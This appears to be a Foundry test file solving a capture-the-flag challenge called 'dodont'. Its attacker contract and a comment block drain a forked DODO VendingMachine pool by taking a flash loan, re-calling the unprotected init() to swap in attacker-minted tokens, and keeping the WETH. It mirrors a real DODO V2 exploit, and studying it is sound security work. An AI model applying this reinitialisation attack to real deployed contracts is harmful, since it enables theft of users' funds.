// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "@openzeppelin-4.9.2/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-4.9.2/contracts/token/ERC20/IERC20.sol";

import "../../src/dodont/Challenge.sol";

interface ICloneFactory {
  function clone(address) external returns (address);
}

interface IDVM {
  function init(
    address maintainer,
    address baseTokenAddress,
    address quoteTokenAddress,
    uint256 lpFeeRate,
    address mtFeeRateModel,
    uint256 i,
    uint256 k,
    bool isOpenTWAP
  ) external;

  function buyShares(address) external;

  function flashLoan(
    uint256 baseAmount,
    uint256 quoteAmount,
    address assetTo,
    bytes calldata data
  ) external;
}

contract QuoteToken is ERC20 {
  constructor() ERC20("Quote Token", "QT") {
    _mint(msg.sender, 1_000_000 ether);
  }
}

contract DodontTest is Test {
  address private immutable deployerAddress = makeAddr("deployer");
  address private immutable playerAddress = makeAddr("player");

  // Simulating the deployment process from Deploy.s.sol
  ICloneFactory private immutable CLONE_FACTORY = ICloneFactory(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
  address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;
  IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  address private challengeAddress;

  function setUp() public {
    // Fork from mainnet state at specific block
    vm.createSelectFork(vm.envString("MAINNET_FORKING_URL"), vm.parseUint(vm.envString("BLOCK_NUMBER")));
    vm.startPrank(deployerAddress);
    vm.deal(deployerAddress, 100 ether);

    // Simulating the deployment process from Deploy.s.sol
    (bool result,) = payable(address(WETH)).call{value: 100 ether}(hex"");
    result;

    QuoteToken quoteToken = new QuoteToken();

    IDVM dvm = IDVM(CLONE_FACTORY.clone(DVM_TEMPLATE));
    dvm.init(
      deployerAddress,
      address(WETH),
      address(quoteToken),
      3000000000000000,
      address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
      1,
      1000000000000000000,
      false
    );

    WETH.transfer(address(dvm), WETH.balanceOf(deployerAddress));
    quoteToken.transfer(address(dvm), quoteToken.balanceOf(deployerAddress) / 2);
    dvm.buyShares(deployerAddress);

    challengeAddress = address(new Challenge(address(dvm)));

    vm.stopPrank();
  }

  function testExploit() public {
    assertFalse(Challenge(challengeAddress).isSolved());
    vm.startPrank(playerAddress);

    Attacker attacker = new Attacker(challengeAddress);
    attacker.attack();

    vm.stopPrank();
    assertTrue(Challenge(challengeAddress).isSolved());
  }

}

// # Exploit Analysis
//
// The challenge forks from mainnet the following contracts:
//
// - 0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88 (See EIP-1167)
// - 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445 (DVM - DODO VendingMachine)
// - 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH - Wrapped Ether)
// - 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01 (DODO FeeRateModel)
//
// The contract deploys a `dvm` instance, pairing WETH with a custom ERC20 token.
//
// ## Objective
//
// Drain `dvm` of all its WETH.
//
// Fully draining WETH via normal swaps is **mathematically impossible**
// due to PMM's asymptotic behavior. Therefore, the exploit must target
// **a vulnerability outside the pricing model**.
//
// One key observation is that we can **borrow the total amount of tokens**
// from the pool using a **flash loan** [1].
//
// ## Discovery of the Vulnerability
//
// A quick search for "Dodo Hack" reveals an article from **SlowMist** [2]
// detailing an exploit on a **wCRES/USDT V2 liquidity pool**. The root cause
// was **insufficient access control on the `init()` function**, allowing an
// attacker to **reinitialize the pool** with arbitrary tokens.
//
// ## Exploit Strategy
//
// 1. Issue a `flashLoan` for the total amount of WETH and QuoteToken.
// 2. Deploy two attacker-controlled ERC20 tokens and mint the borrowed
//    amounts.
// 3. Call the unprotected `init()` function on the pool, replacing WETH
//    and QuoteToken with attacker-controlled tokens.
// 4. Repay the flash loan in attacker-controlled tokens while **keeping**
//    the WETH and QuoteToken.
//
// ## Outcome
//
// Since the contract no longer tracks WETH after reinitialization,
// the original assets remain in the attacker's possession and are
// fully accessible, while the contract considers them non-existent.
//
// ## References
//
// [1] - https://docs.dodoex.io/en/developer/contracts/dodo-v1-v2/guides/flash-loan
// [2] - https://slowmist.medium.com/an-analysis-of-the-attack-on-dodo-628128ee6f5f
//
contract Attacker {
  address private dvmAddress;

  constructor(address challengeAddress) {
    dvmAddress = Challenge(challengeAddress).dvm();
  }

  function attack() external {
    IDVM dvm = IDVM(dvmAddress);
    dvm.flashLoan(100 ether, 500_000 ether, address(this), "0x");
  }

  function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    AttackToken attackTokenA = new AttackToken(100e18);
    AttackToken attackTokenB = new AttackToken(500_000e18);

    IDVM(msg.sender).init(
      address(this),
      address(attackTokenA),
      address(attackTokenB),
      1,
      address(0),
      1,
      1,
      false
    );

    attackTokenA.transfer(msg.sender, 100 ether);
    attackTokenB.transfer(msg.sender, 500_000 ether);
  }
}

contract AttackToken is ERC20 {
  constructor(uint256 initialBalance) ERC20("", "") {
    _mint(msg.sender, initialBalance);
  }
}
